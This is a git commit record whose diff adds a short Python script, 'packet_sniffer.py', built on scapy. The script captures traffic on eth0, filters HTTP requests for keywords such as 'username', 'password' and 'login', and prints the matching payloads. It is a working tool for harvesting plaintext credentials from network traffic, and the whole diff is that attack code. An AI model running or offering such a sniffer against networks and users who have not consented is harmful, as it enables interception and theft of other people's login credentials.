8b01e0f639a3c31f5df6690c354da8ca5deef32d
Mikael Storman Gustavsson <miga02@gmail.com>
2020-09-01 20:11:47 +0200

    Added packet sniffer

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,1 +1,22 @@
+#!/usr/bin/env python
 import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_package)
+    # Do not store packets in mem.
+
+
+def process_sniffed_package(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ['username', 'password', 'email', 'user', 'login', 'password', 'pass']
+            for keyword in keywords:
+                if keyword in load.lower():
+                    print(load)
+                    break
+
+
+sniff('eth0')
